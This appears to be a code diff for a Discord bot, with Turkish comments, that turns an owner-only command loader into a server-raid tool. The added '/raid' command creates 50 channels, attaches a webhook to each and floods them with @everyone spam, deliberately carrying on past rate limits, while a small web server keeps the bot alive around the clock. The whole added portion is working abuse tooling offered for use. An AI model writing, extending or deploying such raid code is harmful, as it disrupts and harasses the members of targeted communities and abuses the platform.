@@ -1,52 +1,77 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, Collection, REST, Routes, Events } = require('discord.js');
-const fs = require('fs');
-const path = require('path');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType } = require('discord.js');
 const http = require('http');
-
-const TOKEN = process.env.DISCORD_BOT_TOKEN;
-const CLIENT_ID = '1394574380394221719'; // Botunun ID'si olduğundan emin ol
-const OWNER_ID = "1389930042200559706";
-const PREFIX = '!';
 
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
+        GatewayIntentBits.MessageContent
     ]
 });
 
-client.commands = new Collection();
-const commandsPath = path.join(__dirname, 'commands');
-if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);
-const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
+const OWNER_ID = "1389930042200559706";
 
-for (const file of commandFiles) {
-    const filePath = path.join(commandsPath, file);
-    const command = require(filePath);
-    if ('name' in command && 'execute' in command) client.commands.set(command.name, command);
-}
+// --- RAID KOMUTU TANIMI ---
+const commands = [
+    new SlashCommandBuilder()
+        .setName('raid')
+        .setDescription('Sunucuyu saniyeler içinde imha eder.')
+        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam mesajı').setRequired(true))
+        .addIntegerOption(opt => opt.setName('miktar').setDescription('Her kanala kaç mesaj?').setRequired(true))
+].map(c => c.toJSON());
 
-client.once(Events.ClientReady, (c) => {
-    console.log(`🚀 Bot Aktif: ${c.user.tag}`);
+client.once('ready', async () => {
+    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
+    try {
+        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
+        console.log(`☣️ RAID MAKİNESİ AKTİF: ${client.user.tag}`);
+    } catch (e) { console.error(e); }
 });
 
-client.on(Events.MessageCreate, async (message) => {
-    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
-    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
-    const commandName = PREFIX + args.shift().toLowerCase();
-    const command = client.commands.get(commandName);
-    if (command && message.author.id === OWNER_ID) {
-        try { await command.execute(message, args); } catch (e) { console.error(e); }
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isChatInputCommand()) return;
+    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "❌ Yetkin yok!", ephemeral: true });
+
+    if (interaction.commandName === 'raid') {
+        const text = interaction.options.getString('mesaj');
+        const amt = interaction.options.getInteger('miktar');
+
+        await interaction.reply({ content: "☣️ **OPERASYON BAŞLATILDI.** Sunucu düşüyor...", ephemeral: true });
+
+        // 50 Tane Kanal Açma Operasyonu
+        for (let i = 0; i < 50; i++) {
+            try {
+                // Kanalı oluştur
+                const channel = await interaction.guild.channels.create({
+                    name: `raided-by-forces-${i}`,
+                    type: ChannelType.GuildText
+                });
+
+                // Webhook oluştur (Hızın anahtarı budur)
+                const webhook = await channel.createWebhook({
+                    name: 'FORCES DESTROYER',
+                });
+
+                // Webhook üzerinden seri atış
+                for (let j = 0; j < amt; j++) {
+                    webhook.send({
+                        content: `@everyone ${text}`,
+                        username: 'FORCES RAID',
+                    }).catch(() => {});
+                    
+                    // 1 saniye bekleme (Botun tamamen kapanmaması için şart)
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            } catch (err) {
+                // Limit yediğinde durma, devam et
+                continue;
+            }
+        }
     }
 });
 
-// RENDER 7/24 UYKU ENGELLEYİCİ
-http.createServer((req, res) => {
-    res.write("FORCES Sunucu Kopyalayici 7/24 Aktif!");
-    res.end();
-}).listen(process.env.PORT || 3000);
+// Render 7/24 Aktif Tutucu
+http.createServer((req, res) => res.end("Raid System Online")).listen(process.env.PORT || 3000);
 
-client.login(TOKEN);
+client.login(process.env.DISCORD_BOT_TOKEN);
